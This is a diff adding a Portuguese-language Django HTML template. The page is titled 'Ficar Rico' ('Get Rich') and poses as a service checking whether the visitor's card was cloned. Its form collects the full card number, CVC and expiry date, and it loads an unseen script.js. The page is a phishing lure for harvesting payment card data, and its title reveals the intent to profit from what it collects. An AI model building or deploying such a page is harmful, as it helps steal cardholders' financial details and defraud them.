@@ -1,0 +1,35 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ficar Rico</title>
+</head>
+<body>
+    <header>
+        <h1>Seu cartão foi clonado?</h1>
+    </header>
+    <div class="center">
+        <div class="glass">
+            <h3>Insira suas informações</h3>
+            <form id="formulario">
+                {% csrf_token %}
+                <div class="cartao">
+                    <input type="number" name="ncartao" id="ncartao" placeholder="   Número do cartão" required>
+                </div>
+                <div class="numeros">
+                    <input type="number" name="ncvv" id="ncvv" placeholder="    CVC" required>
+                    <input type="number" name="nval" id="nval" placeholder="    Validade" required>
+                </div>
+                <div class="botao">
+                    <input type="button" id="botao" value="Verificar">
+                </div>
+            </form>
+            <p id="resposta"></p>
+        </div>
+    </div>
+    <script src="{% static 'js/script.js' %}"></script>
+</body>
+</html>
